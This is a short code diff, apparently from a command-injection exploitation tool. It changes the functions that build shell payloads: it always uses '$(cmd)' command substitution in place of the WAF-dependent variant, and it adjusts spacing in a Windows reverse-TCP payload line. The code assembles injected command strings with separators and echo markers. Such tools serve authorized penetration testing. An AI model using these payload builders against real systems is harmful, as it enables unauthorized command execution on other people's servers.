@@ -98,11 +98,12 @@ def cmd_execution(separator, TAG, cmd):
                 cmd + 
                 "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
                 )
-  else:       
-    if not settings.WAF_ENABLED:
-      cmd_exec = "$(echo $(" + cmd + "))"
-    else:
-      cmd_exec = "$(" + cmd + ")"
+  else:
+     
+    # if not settings.WAF_ENABLED:
+    #   cmd_exec = "$(echo $(" + cmd + "))"
+    # else:
+    cmd_exec = "$(" + cmd + ")"
     payload = (separator +
               "echo " + TAG +
               "$(echo " + TAG + ")" +
@@ -117,7 +118,7 @@ __Warning__: The alternative shells are still experimental.
 def cmd_execution_alter_shell(separator, TAG, cmd):
   if settings.TARGET_OS == "win":
     if settings.REVERSE_TCP:
-      payload = (separator +cmd + " "
+      payload = (separator + cmd + " "
                 )
     else:
       payload = (separator +
